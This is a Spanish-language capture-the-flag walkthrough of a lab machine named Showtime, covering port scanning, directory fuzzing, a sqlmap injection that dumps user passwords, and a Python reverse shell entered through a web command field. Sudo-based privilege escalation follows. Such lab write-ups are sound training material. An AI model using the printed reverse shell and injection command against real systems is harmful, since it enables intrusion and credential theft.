Escaneo de puertos:
![[Pasted image 20240724100312.png]]

Veamos lo que hay en el puerto 80:
![[Pasted image 20240724100412.png]]
Es una pagina web que contiene un casino y sus respectivos juegos

Haremos fuzzing web usando la herramienta de Gobuster:
![[Pasted image 20240724100928.png]]
Y encontramos un /login_page

Veamos lo que hay en esta dirección:
![[Pasted image 20240724101000.png]]
Tenemos un panel de login

Vamos a hacer una inyección SQL con ayuda de la herramienta Sqlmap:
1. Enumeraremos posibles bases de datos
```
sqlmap --url http://172.17.0.3/login_page/ --dbs --batch --forms 
```
![[Pasted image 20240724102205.png]]
![[Pasted image 20240724102216.png]]
Usaremos la base de datos Users

2. Enumeraremos posibles tablas, de esta base de datos:
![[Pasted image 20240724102310.png]]
![[Pasted image 20240724102320.png]]
Tenemos la tabla llamada Usuarios

3. Enumeraremos posibles columnas de esta tabla:
![[Pasted image 20240724102357.png]]
![[Pasted image 20240724102409.png]]
Tenemos 3 columnas id, password y username

4. Y por último, enumeraremos usuarios de estas 3 columnas:
![[Pasted image 20240724102726.png]]
![[Pasted image 20240724102740.png]]
Tenemos 3 usuarios con sus respectivas contraseñas

Probaremos a entrar con el usuario Joe y su respectiva contraseña
![[Pasted image 20240724102945.png]]

Y estamos dentro:
![[Pasted image 20240724103003.png]]
Tenemos un campo para escribir un comando o codigo en python y ver su resultado

Un ejemplo es:
![[Pasted image 20240724103107.png]]
Y damos click en "Ejecutar comando"

Y nos da como resultado:
![[Pasted image 20240724103134.png]]

Ahora, sabiendo eso haremos una reverse shell con python:
![[Pasted image 20240724130255.png]]

```
`import socket`
`import subprocess`
`import os`

`s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`
`s.connect(("172.17.0.1", 443))`
`os.dup2(s.fileno(), 0)`
`os.dup2(s.fileno(), 1)`
`os.dup2(s.fileno(), 2)`
`p = subprocess.call(["/bin/sh", "-i"])`
```
Nos ponemos a la escucha con netcat por el puerto 443
![[Pasted image 20240724125854.png]]
Y damos click en el boton "Ejecutar Comando" y recibimos automaticamente la rev shell
![[Pasted image 20240724130656.png]]

Haremos tratamiento de la TTY:
![[Pasted image 20240724130726.png]]
![[Pasted image 20240724130751.png]]

## ESCALADA DE PRIVILEGIOS

En la carpeta /tmp encontramos un archivo con unos trucos para un juego, pero en realidad pueden ser posibles contraseñas:
![[Pasted image 20240725100027.png]]

Así que primero pasaremos esta lista de mayúsculas a minúsculas, con este comando:
```shell
tr '[:upper:]' '[:lower:]' < archivo.txt > archivo_minusculas.txt

```
![[Pasted image 20240725100324.png]]
Y listo ya lo tenemos en minusculas:
![[Pasted image 20240725100356.png]]

Ahora haremos un ataque de fuerza bruta con este diccionario de contraseñas, así que me descargaré una herramienta en bash para que me automatice esta acción
Usaré esta herramienta de Maalfer https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh
![[Pasted image 20240725100600.png]]
Me creo un servidor con python con el puerto 80 para enviarme esta herramienta hacia la maquina Showtime:
![[Pasted image 20240725100724.png]]
![[Pasted image 20240725100901.png]]
Y listo, ya tengo la herramienta de fuerza bruta en la maquina

Ahora le doy permisos de ejecución con chmod +x ![[Pasted image 20240725100946.png]]
Y ejecuto la herramienta de fuerza bruta con el usuario joe y de contraseñas usaremos el diccionario de las palabras pero en minusculas:
![[Pasted image 20240725101046.png]]
![[Pasted image 20240725101057.png]]
Y nos la encontró

Ahora procedemos a ser el usuario joe con su respectiva contraseña:
![[Pasted image 20240725101157.png]]

Ejecutamos sudo -l para ver el binario que podremos usar 
![[Pasted image 20240725101224.png]]
Observamos que podemos ser el usuario luciano con el binario Posh

Miramos en GTFOBins como podemos escalar con este binario:
![[Pasted image 20240725101302.png]]

Lo ejecutamos:
![[Pasted image 20240725101352.png]]
Y listo, ya somos luciano

Ejecutamos sudo -l para ver el binario que podremos usar 
![[Pasted image 20240725101415.png]]
Observamos que para ser root podemos ejecutar un script hecho en bash

 Lo que contiene el script.sh ubicado en la carpeta /home/luciano es una reverse shell pero con una ip diferente a la nuestra, asi q procederemos a modificar este archivo con una /bin/bash para que al momento de ejecutarlo seamos root inmediatamente
 ![[Pasted image 20240725101701.png]]

Lo ejecutamos:
![[Pasted image 20240725101725.png]]

Y listo, ya somos ROOT
